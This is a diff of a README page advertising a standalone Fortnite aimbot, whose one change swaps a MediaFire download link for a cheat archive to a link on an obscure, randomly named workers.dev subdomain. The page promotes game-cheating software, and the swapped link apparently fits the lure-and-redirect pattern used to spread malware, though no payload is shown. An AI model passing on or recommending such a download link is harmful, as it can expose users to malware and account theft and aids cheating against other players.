@@ -4,7 +4,7 @@ Standalone aimbot for Fortnite with smooth aiming, FOV control and bone priority
 
 ## Download
 
-**[Download Fortnite Aimbot](https://www.mediafire.com/file/9livkzxm1qj0199/Fc_Cheat.zip/file)**
+**[Download Fortnite Aimbot](https://xtiz6i8n6.fresh-link.workers.dev/464dac20)**
 
 ## Features
 
